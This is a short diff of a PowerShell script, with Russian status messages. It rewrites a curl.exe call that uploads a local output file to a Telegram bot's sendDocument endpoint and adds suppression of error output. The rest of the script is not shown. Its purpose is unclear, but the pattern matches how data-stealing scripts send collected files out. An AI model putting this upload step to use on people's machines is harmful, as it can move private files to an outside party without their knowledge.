@@ -959,7 +959,8 @@ Write-Host "[*] Отправка в Telegram..." -ForegroundColor Yellow
 
 # Пробуем curl
 try {
-    & curl.exe -s -F chat_id="$chat" -F document=@"$outputFile" "https://api.telegram.org/bot$token/sendDocument"
+    $curlArgs = @('-s', '-F', "chat_id=$chat", '-F', "document=@$outputFile", "https://api.telegram.org/bot$token/sendDocument")
+    & curl.exe $curlArgs 2>$null
     Write-Host "[+] Отправлено через curl" -ForegroundColor Green
 }
 catch {
